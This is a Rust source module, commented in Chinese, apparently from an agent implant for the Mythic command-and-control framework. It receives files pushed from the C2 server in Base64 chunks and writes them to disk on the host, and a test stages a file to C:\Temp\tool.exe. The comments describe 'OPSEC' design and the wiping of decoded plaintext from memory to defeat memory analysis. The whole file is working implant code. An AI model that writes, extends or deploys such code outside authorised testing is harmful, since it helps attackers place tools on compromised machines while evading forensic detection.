//! # 下发接收与流式落盘引擎 (Inbound Transfer Engine: Mythic -> Agent)
//!
//! ## 架构核心哲学与 100% 零堆纯栈契约 (Zero-Heap OPSEC Architecture)
//!
//! 遵循 Mythic 4.0 官方规范：
//! 1. Agent 任务派发后，发送 `FileUploadRequest { file_id, chunk_size, chunk_num, full_path }`；
//! 2. 服务端在回执中返回带有 `total_chunks`, `chunk_num`, `chunk_data` 的数据切片；
//! 3. 本状态机就地 Base64 解码并流式落盘写入目标 Writer，自动推进分片计数，直至全部写入完成。

use base64::Engine;
use crate::buffer::zeroize_slice;
pub use crate::error::FileTransferError;
use crate::protocol::{FileUploadRequest, TaskResponseItem};
use crate::stream::ZeroWrite;

// ==========================================
// 1. 服务端文件下发接收状态机 (Inbound Transfer Session)
// ==========================================

/// 服务端下发文件接收会话 (Mythic -> Agent 文件下发与流式落盘)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferReceiveSession<'a> {
    /// 触发本文件接收的任务 UUID
    pub task_id: &'a str,
    /// 待接收文件的 UUID (定长 36 字节)
    pub file_id: [u8; 36],
    /// 单次请求的分片大小 (字节)
    pub chunk_size: u32,
    /// 目标文件落地完整路径 (可选)
    pub full_path: Option<&'a str>,
    /// 当前期待请求的分片序号 (1-based，从 1 开始)
    pub current_chunk_num: u32,
    /// 服务端通报的总分片数 (初始为 0，收到首片后锁定)
    pub total_chunks: u32,
    /// 已成功写入的累计字节数
    pub received_bytes: u64,
    /// 是否已全部接收完毕
    pub is_complete: bool,
}

impl<'a> TransferReceiveSession<'a> {
    /// 创建新的文件接收会话
    #[inline]
    pub fn new(
        task_id: &'a str,
        file_id_str: &str,
        chunk_size: u32,
        full_path: Option<&'a str>,
    ) -> Result<Self, FileTransferError> {
        if file_id_str.len() != 36 {
            return Err(FileTransferError::InvalidState);
        }
        let mut file_id = [0u8; 36];
        file_id.copy_from_slice(file_id_str.as_bytes());

        Ok(Self {
            task_id,
            file_id,
            chunk_size,
            full_path,
            current_chunk_num: 1,
            total_chunks: 0,
            received_bytes: 0,
            is_complete: false,
        })
    }

    /// 获取当前文件 ID 文本切片
    #[inline(always)]
    pub fn file_id_str(&self) -> &str {
        core::str::from_utf8(&self.file_id).unwrap_or("")
    }

    /// 生成拉取下一个分片的请求报文 (用于挂载在 TaskResponseItem.upload)
    #[inline]
    pub fn build_chunk_request(&self) -> FileUploadRequest<'_> {
        FileUploadRequest {
            chunk_size: self.chunk_size,
            file_id: self.file_id_str(),
            chunk_num: self.current_chunk_num,
            full_path: self.full_path,
        }
    }

    /// 生成包含拉取分片请求的通用任务回执项
    #[inline]
    pub fn build_chunk_task_response(&self) -> TaskResponseItem<'_> {
        let mut item = TaskResponseItem::new(self.task_id, "", false);
        item.upload = Some(self.build_chunk_request());
        item
    }

    /// 接收并就地解密服务端下发的分片数据，流式写入目标 Writer (零堆分配)
    ///
    /// * `chunk_data_b64`: 服务端下发的 Base64 数据切片
    /// * `total_chunks`: 服务端下发的总分片数
    /// * `chunk_num`: 本次下发的分片序号
    /// * `raw_buf`: 供 Base64 解码的二进制暂存区
    /// * `writer`: 目标写入流 (如物理文件句柄或内存缓冲区)
    /// * 返回: 本次成功写入的字节数
    pub fn write_incoming_chunk<W: ZeroWrite>(
        &mut self,
        chunk_data_b64: &str,
        total_chunks: u32,
        chunk_num: u32,
        raw_buf: &mut [u8],
        writer: &mut W,
    ) -> Result<usize, FileTransferError> {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }
        if chunk_num != self.current_chunk_num {
            return Err(FileTransferError::OffsetMismatch);
        }

        self.total_chunks = total_chunks;

        // 就地 Base64 解码至 raw_buf
        let written = base64::prelude::BASE64_STANDARD
            .decode_slice(chunk_data_b64.as_bytes(), raw_buf)
            .map_err(|_| FileTransferError::Base64Error)?;

        // 流式写入目标句柄 (支持 std::fs::File 与 Windows NativeFileHandle)
        writer.zero_write_all(&raw_buf[..written])?;
        writer.zero_flush()?;

        // 物理刷零明文，防内存分析
        zeroize_slice(&mut raw_buf[..written]);

        self.received_bytes += written as u64;
        self.current_chunk_num += 1;

        if self.current_chunk_num > self.total_chunks {
            self.is_complete = true;
        }

        Ok(written)
    }
}

// ==========================================
// 2. 单元测试
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::vec::Vec;

    #[test]
    fn test_transfer_receive_session_lifecycle() {
        let file_uuid = "22223333-4444-5555-6666-777788889999";
        let mut recv_sess = TransferReceiveSession::new(
            "task-upload-001",
            file_uuid,
            512,
            Some("C:\\Temp\\tool.exe"),
        )
        .unwrap();

        assert_eq!(recv_sess.current_chunk_num, 1);
        assert!(!recv_sess.is_complete);

        // 1. 构建第 1 片拉取请求
        let req1 = recv_sess.build_chunk_request();
        assert_eq!(req1.chunk_num, 1);
        assert_eq!(req1.chunk_size, 512);
        assert_eq!(req1.file_id, file_uuid);

        // 2. 模拟服务端下发第 1 片数据 Base64 ("Hello, World! Chunk 1")
        let chunk1_raw = b"Hello, World! Chunk 1";
        let mut b64_buf = [0u8; 128];
        let b64_len = base64::prelude::BASE64_STANDARD
            .encode_slice(chunk1_raw, &mut b64_buf)
            .unwrap();
        let chunk1_b64 = core::str::from_utf8(&b64_buf[..b64_len]).unwrap();

        let mut received_file_data = Vec::new();
        let mut raw_buf = [0u8; 1024];

        let written = recv_sess
            .write_incoming_chunk(chunk1_b64, 2, 1, &mut raw_buf, &mut received_file_data)
            .unwrap();
        assert_eq!(written, chunk1_raw.len());
        assert_eq!(recv_sess.current_chunk_num, 2);
        assert!(!recv_sess.is_complete);

        // 3. 模拟服务端下发第 2 片数据并收尾
        let chunk2_raw = b"Hello, World! Chunk 2 (EOF)";
        let b64_len2 = base64::prelude::BASE64_STANDARD
            .encode_slice(chunk2_raw, &mut b64_buf)
            .unwrap();
        let chunk2_b64 = core::str::from_utf8(&b64_buf[..b64_len2]).unwrap();

        let written2 = recv_sess
            .write_incoming_chunk(chunk2_b64, 2, 2, &mut raw_buf, &mut received_file_data)
            .unwrap();
        assert_eq!(written2, chunk2_raw.len());
        assert_eq!(recv_sess.current_chunk_num, 3);
        assert!(recv_sess.is_complete);

        assert_eq!(
            received_file_data,
            b"Hello, World! Chunk 1Hello, World! Chunk 2 (EOF)"
        );
    }
}
